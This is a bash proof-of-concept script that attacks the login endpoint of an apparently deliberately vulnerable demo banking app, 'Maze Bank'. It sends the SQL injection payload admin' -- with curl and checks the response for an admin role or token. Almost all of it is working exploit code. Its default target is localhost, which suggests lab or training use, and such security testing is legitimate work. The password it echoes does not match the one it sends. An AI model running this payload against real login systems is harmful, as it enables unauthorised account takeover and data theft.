#!/usr/bin/env bash
# ==============================================================================
# PoC: SQL Injection Login Bypass
# Demonstrates SQL injection on /api/auth/login using username payload: admin' --
# ==============================================================================

TARGET_URL="${1:-http://localhost:5000}"

echo "========================================================"
echo "🎯 Maze Bank PoC: SQL Injection Authentication Bypass"
echo "Target: ${TARGET_URL}"
echo "========================================================"

echo ""
echo "[*] Sending SQL Injection payload in username: admin' --"
echo "[*] Password provided: 'random_wrong_password'"
echo ""

RESPONSE=$(curl -s -X POST "${TARGET_URL}/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' --","password":"wrong_password"}')

echo "[*] Response received from server:"
echo "${RESPONSE}"
echo ""

if echo "${RESPONSE}" | grep -q '"role":"admin"' || echo "${RESPONSE}" | grep -q '"token"'; then
  echo "✅ VULNERABILITY CONFIRMED: Successfully bypassed login as admin!"
  exit 0
else
  echo "❌ Exploitation failed or server returned unexpected response."
  exit 1
fi
